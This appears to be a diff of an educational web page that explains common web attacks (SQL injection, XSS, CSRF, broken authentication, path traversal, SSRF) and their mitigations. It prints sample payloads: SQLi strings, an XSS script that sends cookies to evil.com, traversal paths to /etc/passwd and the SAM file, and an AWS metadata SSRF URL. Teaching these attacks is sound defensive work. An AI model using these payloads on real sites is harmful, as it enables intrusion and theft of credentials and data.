@@ -447,115 +447,138 @@ Switch(config-if-range)# no negotiate auto</code></pre>
         </section>
 
         <!-- ==================== SECTION 3: APPLICATION & WEB ATTACKS ==================== -->
-        <section id="web-attacks">
-            <h2 class="section-title">3. Application & Web Attacks</h2>
-            <p class="text-block">These attacks exploit vulnerabilities in web applications, APIs, and software. They are among the most common attack vectors because web apps are exposed to the internet.</p>
+  <style>
+/* Add this rule inside your existing <style> block */
+.attack-card-img {
+    width: 100%; height: 180px; border-radius: 12px;
+    object-fit: cover; margin-bottom: 14px;
+    background: var(--input-bg);
+    transition: transform 0.3s;
+}
+.attack-card:hover .attack-card-img { transform: scale(1.02); }
 
-            <div class="attack-grid">
-                <!-- SQL Injection -->
-                <div class="attack-card severity-critical">
-                    <div class="attack-card-header">
-                        <div class="attack-card-icon icon-red">💉</div>
-                        <div class="attack-card-title">SQL Injection (SQLi)</div>
-                    </div>
-                    <span class="attack-card-severity severity-badge-critical">CRITICAL</span>
-                    <img class="attack-card-img" src="https://www.spanning.com/blog/sql-injection-attacks-web-based-application-security-part-4/SQL-injection-attack-example.png" alt="SQL injection attack on a database through a web form">
-                    <p>Injecting malicious SQL code into input fields that are improperly sanitized. The attacker can read, modify, or delete database contents.</p>
-                    <ul>
-                        <li><strong>In-band:</strong> Same channel for injection and results</li>
-                        <li><strong>Blind:</strong> No direct output (boolean-based, time-based)</li>
-                        <li><strong>Out-of-band:</strong> Uses DNS/HTTP to exfiltrate data</li>
-                    </ul>
-                    <pre><code>' OR 1=1; --
-' UNION SELECT username, password FROM users --
-' OR '1'='1' --
--- GOOD: "SELECT * FROM users WHERE id=?" (prepared)</code></pre>
-                </div>
+@media (max-width: 900px) {
+    .attack-card-img { height: 150px; }
+}
+</style>
 
-                <!-- XSS -->
-                <div class="attack-card severity-critical">
-                    <div class="attack-card-header">
-                        <div class="attack-icon icon-red" style="background:rgba(239,68,68,0.12);width:48px;height:48px;border-radius:14px;display:flex;align-items:center;justify-content:center;font-size:1.2rem;"><code>&lt;/&gt;</div>
-                        <div class="attack-card-title">Cross-Site Scripting (XSS)</div>
-                    </div>
-                    <span class="attack-card-severity severity-badge-critical">CRITICAL</span>
-                    <img class="attack-card-img" src="https://www.spanning.com/blog/cross-site-scripting-web-based-application-security-part-3/cross-site-scripting-example.png" alt="Cross site scripting attack injecting script into a webpage">
-                    <p>Injecting malicious client-side scripts into web pages viewed by other users. The script executes in the victim's browser.</p>
-                    <ul>
-                        <li><strong>Reflected XSS:</strong> Payload in the URL, reflected back in the response</li>
-                        <li><strong>Stored XSS:</strong> Payload persisted in the database</li>
-                        <li><strong>DOM-based XSS:</strong> Payload manipulates the DOM directly</li>
-                    </ul>
-                    <pre><code>&lt;script&gt;document.location='http://evil.com/?c='+document.cookie&lt;/script&gt;
-&lt;img src=x onerror="alert('XSS')"&gt;
--- Mitigation: output encoding, CSP headers, input validation</code></pre>
-                </div>
+<!-- Then replace your entire Section 3 with this: -->
 
-                <!-- CSRF -->
-                <div class="attack-card severity-high">
-                    <div class="attack-card-header">
-                        <div class="attack-card-icon icon-orange">🔄</div>
-                        <div class="attack-card-title">Cross-Site Request Forgery (CSRF)</div>
-                    </div>
-                    <span class="attack-card-severity severity-badge-high">HIGH</span>
-                    <img class="attack-card-img" src="https://www.spanning.com/blog/cross-site-forgery-web-based-application-security-part-2/cross-site-request-forgery-example.png" alt="CSRF attack tricking a user into submitting a fake request">
-                    <p>Tricking an authenticated user into unknowingly submitting a request to a web application where they are already logged in.</p>
-                    <ul>
-                        <li>A hidden form on a malicious site submits to the bank's transfer endpoint</li>
-                        <li>The victim's browser automatically sends session cookies</li>
-                        <li>Mitigation: CSRF tokens, SameSite cookie, referer checking</li>
-                    </ul>
-                </div>
+<section id="web-attacks">
+    <h2 class="section-title">3. Application & Web Attacks</h2>
+    <p class="text-block">These attacks exploit vulnerabilities in web applications, APIs, and software. They are among the most common attack vectors because web apps are exposed to the internet and often contain coding flaws.</p>
 
-                <!-- Broken Authentication -->
-                <div class="attack-card severity-high">
-                    <div class="attack-card-header">
-                        <div class="attack-card-icon icon-orange">🔓</div>
-                        <div class="attack-card-title">Broken Authentication</div>
-                    </div>
-                    <span class="attack-card-severity severity-badge-high">HIGH</span>
-                    <img class="attack-card-img" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcROVhexRiCqxpOy_2N8NkD9NuHWHUDmvYoDm28067aL00_MBcVJ7GQpm_g&s=10" alt="Broken authentication allowing unauthorized access to an account">
-                    <p>Exploiting weaknesses in authentication mechanisms to assume other users' identities.</p>
-                    <ul>
-                        <li><strong>Credential stuffing:</strong> Using leaked username/password pairs</li>
-                        <li><strong>Brute force:</strong> Systematically trying every possible password</li>
-                        <li><strong>Session fixation:</strong> Forcing a predetermined session ID</li>
-                    </ul>
-                </div>
-
-                <!-- Directory Traversal -->
-                <div class="attack-card severity-high">
-                    <div class="attack-card-header">
-                        <div class="attack-card-icon icon-orange">📁</div>
-                        <div class="attack-card-title">Directory Traversal</div>
-                    </div>
-                    <span class="attack-card-severity severity-badge-high">HIGH</span>
-                    <img class="attack-card-img" src="https://cdn.prod.website-files.com/6a020fca21245d64af2c19d8/6a020fca21245d64af2c3fe0_67b4314e84d1854611ff5494_6255a39a3945c916f6685f36_path%252520traversal%252520example.jpeg" alt="Directory traversal attack navigating through filesystem folders">
-                    <p>Exploiting insufficient input validation to access files outside the intended folder using dot-dot-slash sequences.</p>
-                    <ul>
-                        <li><span class="inline-code">../../../../etc/passwd</span></li>
-                        <li><span class="inline-code">....//....//windows/system32/config/sam</span></li>
-                        <li>Mitigation: input validation, chroot, allowlist paths</li>
-                    </ul>
-                </div>
-
-                <!-- SSRF -->
-                <div class="attack-card severity-medium">
-                    <div class="attack-card-header">
-                        <div class="attack-card-icon icon-blue">🔗</div>
-                        <div class="attack-card-title">SSRF (Server-Side Request Forgery)</div>
-                    </div>
-                    <span class="attack-card-severity severity-badge-medium">MEDIUM</span>
-                    <img class="attack-card-img" src="https://media.licdn.com/dms/image/v2/D5612AQGX_kATcFDt1Q/article-cover_image-shrink_600_2000/article-cover_image-shrink_600_2000/0/1682116408672?e=2147483647&v=beta&t=ZwJDazWgFG_Z2MVjxtuqX8-m3Inm6WgDpdD51G25sG4" alt="SSRF attack forcing a server to make requests to internal resources">
-                    <p>Forcing a server to make HTTP requests to an arbitrary domain/IP chosen by the attacker.</p>
-                    <ul>
-                        <li><span class="inline-code">?url=http://169.254.169.254/latest/meta-data/</span> (AWS metadata)</li>
-                        <li>Can access internal services not exposed to the internet</li>
-                        <li>Mitigation: URL allowlists, disable unnecessary outbound HTTP</li>
-                    </ul>
-                </div>
+    <div class="attack-grid">
+        <!-- SQL Injection -->
+        <div class="attack-card severity-critical">
+            <div class="attack-card-header">
+                <div class="attack-card-icon icon-red">💉</div>
+                <div class="attack-card-title">SQL Injection (SQLi)</div>
             </div>
-        </section>
+            <span class="attack-card-severity severity-badge-critical">CRITICAL</span>
+            <img class="attack-card-img" src="https://www.spanning.com/blog/sql-injection-attacks-web-based-application-security-part-4/SQL-injection-attack-example.png" alt="SQL injection attack on a database through a web form">
+            <p>Injecting malicious SQL code into input fields that are improperly sanitized. The attacker can read, modify, or delete database contents, and sometimes execute system commands.</p>
+            <ul>
+                <li><strong>In-band:</strong> Same channel for injection and results (UNION-based, error-based)</li>
+                <li><strong>Blind:</strong> No direct output (boolean-based, time-based)</li>
+                <li><strong>Out-of-band:</strong> Uses DNS/HTTP to exfiltrate data</li>
+            </ul>
+            <pre><code>-- Example SQL injection payload
+' OR 1=1; --
+' UNION SELECT username, password FROM users --
+' OR '1'='1' -- 
+
+-- Mitigation: parameterized queries / prepared statements
+-- BAD:  "SELECT * FROM users WHERE id=" + userInput
+-- GOOD: "SELECT * FROM users WHERE id=?" (with bound param)</code></pre>
+        </div>
+
+        <!-- XSS -->
+        <div class="attack-card severity-critical">
+            <div class="attack-card-header">
+                <div class="attack-card-icon icon-red">&lt;script&gt;</div>
+                <div class="attack-card-title">Cross-Site Scripting (XSS)</div>
+            </div>
+            <span class="attack-card-severity severity-badge-critical">CRITICAL</span>
+            <img class="attack-card-img" src="https://www.spanning.com/blog/cross-site-scripting-web-based-application-security-part-3/cross-site-scripting-example.png" alt="Cross site scripting attack injecting script into a webpage">
+            <p>Injecting malicious client-side scripts into web pages viewed by other users. The script executes in the victim's browser with the same permissions as the legitimate site.</p>
+            <ul>
+                <li><strong>Reflected XSS:</strong> Payload in the URL, reflected back in the response</li>
+                <li><strong>Stored XSS:</strong> Payload persisted in the database (forum posts, comments)</li>
+                <li><strong>DOM-based XSS:</strong> Payload manipulates the DOM directly, never reaches the server</li>
+            </ul>
+            <pre><code>&lt;script&gt;document.location='http://evil.com/steal?c='+document.cookie&lt;/script&gt;
+&lt;img src=x onerror="alert('XSS')"&gt;
+
+-- Mitigation: output encoding, Content-Security-Policy headers,
+-- input validation, use framework auto-escaping</code></pre>
+        </div>
+
+        <!-- CSRF -->
+        <div class="attack-card severity-high">
+            <div class="attack-card-header">
+                <div class="attack-card-icon icon-orange">🔄</div>
+                <div class="attack-card-title">Cross-Site Request Forgery (CSRF)</div>
+            </div>
+            <span class="attack-card-severity severity-badge-high">HIGH</span>
+            <img class="attack-card-img" src="https://www.spanning.com/blog/cross-site-forgery-web-based-application-security-part-2/cross-site-request-forgery-example.png" alt="CSRF attack tricking a user into submitting a fake request">
+            <p>Tricking an authenticated user into unknowingly submitting a request to a web application where they are already logged in. The attack exploits the browser's automatic inclusion of session cookies.</p>
+            <ul>
+                <li>A hidden form on a malicious site submits to the bank's transfer endpoint</li>
+                <li>The victim's browser automatically sends session cookies</li>
+                <li>Mitigation: CSRF tokens, SameSite cookie attribute, referer checking</li>
+            </ul>
+        </div>
+
+        <!-- Broken Authentication -->
+        <div class="attack-card severity-high">
+            <div class="attack-card-header">
+                <div class="attack-card-icon icon-orange">🔓</div>
+                <div class="attack-card-title">Broken Authentication</div>
+            </div>
+            <span class="attack-card-severity severity-badge-high">HIGH</span>
+            <img class="attack-card-img" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcROVhexRiCqxpOy_2N8NkD9NuHWHUDmvYoDm28067aL00_MBcVJ7GQpm_g&s=10" alt="Broken authentication allowing unauthorized access to an account">
+            <p>Exploiting weaknesses in authentication mechanisms to assume other users' identities. Includes credential stuffing, brute force, and session management flaws.</p>
+            <ul>
+                <li><strong>Credential stuffing:</strong> Using leaked username/password pairs from other breaches</li>
+                <li><strong>Brute force:</strong> Systematically trying every possible password</li>
+                <li><strong>Session fixation:</strong> Forcing a victim to use a predetermined session ID</li>
+            </ul>
+        </div>
+
+        <!-- Directory Traversal -->
+        <div class="attack-card severity-high">
+            <div class="attack-card-header">
+                <div class="attack-card-icon icon-orange">📁</div>
+                <div class="attack-card-title">Directory Traversal / Path Traversal</div>
+            </div>
+            <span class="attack-card-severity severity-badge-high">HIGH</span>
+            <img class="attack-card-img" src="https://cdn.prod.website-files.com/6a020fca21245d64af2c19d8/6a020fca21245d64af2c3fe0_67b4314e84d1854611ff5494_6255a39a3945c916f6685f36_path%252520traversal%252520example.jpeg" alt="Directory traversal attack navigating through filesystem folders">
+            <p>Exploiting insufficient input validation to access files and directories outside the intended folder. Uses dot-dot-slash sequences to traverse the filesystem.</p>
+            <ul>
+                <li><span class="inline-code">../../../../etc/passwd</span></li>
+                <li><span class="inline-code">....//....//....//windows/system32/config/sam</span></li>
+                <li>Mitigation: input validation, chroot, allowlist permitted paths</li>
+            </ul>
+        </div>
+
+        <!-- SSRF -->
+        <div class="attack-card severity-medium">
+            <div class="attack-card-header">
+                <div class="attack-card-icon icon-blue">🔗</div>
+                <div class="attack-card-title">SSRF (Server-Side Request Forgery)</div>
+            </div>
+            <span class="attack-card-severity severity-badge-medium">MEDIUM</span>
+            <img class="attack-card-img" src="https://media.licdn.com/dms/image/v2/D5612AQGX_kATcFDt1Q/article-cover_image-shrink_600_2000/article-cover_image-shrink_600_2000/0/1682116408672?e=2147483647&v=beta&t=ZwJDazWgFG_Z2MVjxtuqX8-m3Inm6WgDpdD51G25sG4" alt="SSRF attack forcing a server to make requests to internal resources">
+            <p>Forcing a server to make HTTP requests to an arbitrary domain/IP chosen by the attacker. Used to scan internal networks, access cloud metadata services, or bypass firewalls.</p>
+            <ul>
+                <li><span class="inline-code">?url=http://169.254.169.254/latest/meta-data/</span> (AWS metadata)</li>
+                <li>Can access internal services not exposed to the internet</li>
+                <li>Mitigation: URL allowlists, disable unnecessary outbound HTTP</li>
+            </ul>
+        </div>
+    </div>
+</section>
 
         <!-- ==================== SECTION 4: MALWARE-BASED ATTACKS ==================== -->
         <section id="malware-attacks">
